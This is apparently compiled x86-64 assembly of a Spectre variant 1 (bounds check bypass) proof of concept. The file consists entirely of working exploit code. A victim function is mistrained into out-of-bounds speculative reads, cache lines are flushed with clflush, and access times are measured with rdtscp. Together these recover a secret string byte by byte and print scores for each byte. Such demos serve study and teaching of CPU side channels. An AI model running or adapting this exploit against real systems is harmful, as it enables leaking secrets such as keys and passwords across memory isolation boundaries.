	.file	"Source.c"
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.comm	unused1,64,32
	.globl	array1
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.byte	1
	.byte	2
	.byte	3
	.byte	4
	.byte	5
	.byte	6
	.byte	7
	.byte	8
	.byte	9
	.byte	10
	.byte	11
	.byte	12
	.byte	13
	.byte	14
	.byte	15
	.byte	16
	.zero	144
	.comm	unused2,64,32
	.comm	array2,131072,32
	.globl	secret
	.section	.rodata
.LC0:
	.string	"My Name is Darsh Asher"
	.section	.data.rel.local,"aw",@progbits
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.section	.rodata
.LC1:
	.string	"Critical Section Begins"
	.text
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB3923:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%rdi, -8(%rbp)
	leaq	.LC1(%rip), %rdi
	call	puts@PLT
	movl	array1_size(%rip), %eax
	movl	%eax, %eax
	cmpq	%rax, -8(%rbp)
	jnb	.L2
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	sall	$9, %eax
	movslq	%eax, %rdx
	leaq	array2(%rip), %rax
	movzbl	(%rdx,%rax), %edx
	movzbl	temp(%rip), %eax
	andl	%edx, %eax
	movb	%al, temp(%rip)
.L2:
	leaq	.LC1(%rip), %rdi
	call	puts@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3923:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB3924:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$136, %rsp
	.cfi_offset 3, -24
	movq	%rdi, -120(%rbp)
	movq	%rsi, -128(%rbp)
	movq	%rdx, -136(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, -108(%rbp)
	movl	$0, -96(%rbp)
	jmp	.L4
.L5:
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.23638(%rip), %rax
	movl	$0, (%rdx,%rax)
	addl	$1, -96(%rbp)
.L4:
	cmpl	$255, -96(%rbp)
	jle	.L5
	movl	$999, -100(%rbp)
	jmp	.L6
.L26:
	movl	$0, -96(%rbp)
	jmp	.L7
.L8:
	movl	-96(%rbp), %eax
	sall	$9, %eax
	movslq	%eax, %rdx
	leaq	array2(%rip), %rax
	addq	%rdx, %rax
	movq	%rax, -56(%rbp)
	movq	-56(%rbp), %rax
	clflush	(%rax)
	addl	$1, -96(%rbp)
.L7:
	cmpl	$255, -96(%rbp)
	jle	.L8
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %eax
	movq	%rax, -80(%rbp)
	movl	$29, -92(%rbp)
	jmp	.L9
.L12:
	leaq	array1_size(%rip), %rax
	movq	%rax, -48(%rbp)
	movq	-48(%rbp), %rax
	clflush	(%rax)
	movl	$0, -104(%rbp)
	jmp	.L10
.L11:
	movl	-104(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -104(%rbp)
.L10:
	movl	-104(%rbp), %eax
	cmpl	$99, %eax
	jle	.L11
	movl	-92(%rbp), %ecx
	movl	$715827883, %edx
	movl	%ecx, %eax
	imull	%edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -64(%rbp)
	movq	-120(%rbp), %rax
	xorq	-80(%rbp), %rax
	andq	-64(%rbp), %rax
	xorq	-80(%rbp), %rax
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	movq	%rax, %rdi
	call	victim_function
	subl	$1, -92(%rbp)
.L9:
	cmpl	$0, -92(%rbp)
	jns	.L12
	movl	$0, -96(%rbp)
	jmp	.L13
.L17:
	movl	-96(%rbp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -84(%rbp)
	movl	-84(%rbp), %eax
	sall	$9, %eax
	movslq	%eax, %rdx
	leaq	array2(%rip), %rax
	addq	%rdx, %rax
	movq	%rax, -72(%rbp)
	leaq	-108(%rbp), %rax
	movq	%rax, -32(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-32(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, %rbx
	movq	-72(%rbp), %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, -108(%rbp)
	leaq	-108(%rbp), %rax
	movq	%rax, -40(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-40(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%rbx, %rax
	movq	%rax, %rbx
	cmpq	$80, %rbx
	ja	.L16
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %edx
	leaq	array1(%rip), %rax
	movzbl	(%rdx,%rax), %eax
	movzbl	%al, %eax
	cmpl	%eax, -84(%rbp)
	je	.L16
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.23638(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.23638(%rip), %rax
	movl	%ecx, (%rdx,%rax)
.L16:
	addl	$1, -96(%rbp)
.L13:
	cmpl	$255, -96(%rbp)
	jle	.L17
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.L18
.L23:
	cmpl	$0, -92(%rbp)
	js	.L19
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.23638(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.23638(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L20
.L19:
	movl	-92(%rbp), %eax
	movl	%eax, -88(%rbp)
	movl	-96(%rbp), %eax
	movl	%eax, -92(%rbp)
	jmp	.L21
.L20:
	cmpl	$0, -88(%rbp)
	js	.L22
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.23638(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.23638(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L21
.L22:
	movl	-96(%rbp), %eax
	movl	%eax, -88(%rbp)
.L21:
	addl	$1, -96(%rbp)
.L18:
	cmpl	$255, -96(%rbp)
	jle	.L23
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.23638(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.23638(%rip), %rax
	movl	(%rcx,%rax), %eax
	addl	%eax, %eax
	addl	$5, %eax
	cmpl	%eax, %edx
	jge	.L24
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.23638(%rip), %rax
	movl	(%rdx,%rax), %eax
	cmpl	$2, %eax
	jne	.L25
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.23638(%rip), %rax
	movl	(%rdx,%rax), %eax
	testl	%eax, %eax
	je	.L24
.L25:
	subl	$1, -100(%rbp)
.L6:
	cmpl	$0, -100(%rbp)
	jg	.L26
.L24:
	movl	results.23638(%rip), %eax
	movl	%eax, %edx
	movl	-108(%rbp), %eax
	xorl	%edx, %eax
	movl	%eax, results.23638(%rip)
	movl	-92(%rbp), %eax
	movl	%eax, %edx
	movq	-128(%rbp), %rax
	movb	%dl, (%rax)
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.23638(%rip), %rax
	movl	(%rdx,%rax), %edx
	movq	-136(%rbp), %rax
	movl	%edx, (%rax)
	movq	-128(%rbp), %rax
	addq	$1, %rax
	movl	-88(%rbp), %edx
	movb	%dl, (%rax)
	movq	-136(%rbp), %rax
	leaq	4(%rax), %rdx
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.23638(%rip), %rax
	movl	(%rcx,%rax), %eax
	movl	%eax, (%rdx)
	nop
	movq	-24(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L27
	call	__stack_chk_fail@PLT
.L27:
	addq	$136, %rsp
	popq	%rbx
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3924:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
.LC2:
	.string	"THe original string is :- %s\n"
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
.LC6:
	.string	"Success"
.LC7:
	.string	"Unclear"
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.text
	.globl	main
	.type	main, @function
main:
.LFB3925:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movl	%edi, -52(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	secret(%rip), %rax
	movq	%rax, %rdx
	leaq	array1(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -40(%rbp)
	movq	secret(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	secret(%rip), %rax
	movq	%rax, %rdi
	call	strlen@PLT
	movl	%eax, -44(%rbp)
	movq	$0, -32(%rbp)
	jmp	.L29
.L30:
	leaq	array2(%rip), %rdx
	movq	-32(%rbp), %rax
	addq	%rdx, %rax
	movb	$1, (%rax)
	addq	$1, -32(%rbp)
.L29:
	cmpq	$131071, -32(%rbp)
	jbe	.L30
	cmpl	$3, -52(%rbp)
	jne	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-40(%rbp), %rdx
	leaq	.LC3(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movq	-40(%rbp), %rdx
	leaq	array1(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -40(%rbp)
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	leaq	.LC4(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movl	-44(%rbp), %eax
	movq	-40(%rbp), %rdx
	movq	%rdx, %rcx
	movl	%eax, %edx
	movq	%rcx, %rsi
	leaq	.LC5(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L32
.L40:
	movq	-40(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -40(%rbp)
	leaq	-20(%rbp), %rdx
	leaq	-10(%rbp), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	readMemoryByte
	movl	-20(%rbp), %eax
	movl	-16(%rbp), %edx
	addl	%edx, %edx
	cmpl	%edx, %eax
	jl	.L33
	leaq	.LC6(%rip), %rax
	jmp	.L34
.L33:
	leaq	.LC7(%rip), %rax
.L34:
	movq	%rax, %rsi
	leaq	.LC8(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-20(%rbp), %edx
	movzbl	-10(%rbp), %eax
	cmpb	$31, %al
	jbe	.L35
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L35
	movzbl	-10(%rbp), %eax
	movzbl	%al, %eax
	jmp	.L36
.L35:
	movl	$63, %eax
.L36:
	movzbl	-10(%rbp), %ecx
	movzbl	%cl, %esi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC9(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-16(%rbp), %eax
	testl	%eax, %eax
	jle	.L37
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L38
	movzbl	-9(%rbp), %eax
	cmpb	$126, %al
	ja	.L38
	movzbl	-9(%rbp), %eax
	movzbl	%al, %eax
	jmp	.L39
.L38:
	movl	$63, %eax
.L39:
	movzbl	-9(%rbp), %ecx
	movzbl	%cl, %esi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC10(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
.L37:
	movl	$10, %edi
	call	putchar@PLT
.L32:
	movl	-44(%rbp), %eax
	subl	$1, %eax
	movl	%eax, -44(%rbp)
	movl	-44(%rbp), %eax
	testl	%eax, %eax
	jns	.L40
	movl	$0, %eax
	movq	-8(%rbp), %rcx
	xorq	%fs:40, %rcx
	je	.L42
	call	__stack_chk_fail@PLT
.L42:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3925:
	.size	main, .-main
	.local	results.23638
	.comm	results.23638,1024,32
	.ident	"GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0"
	.section	.note.GNU-stack,"",@progbits
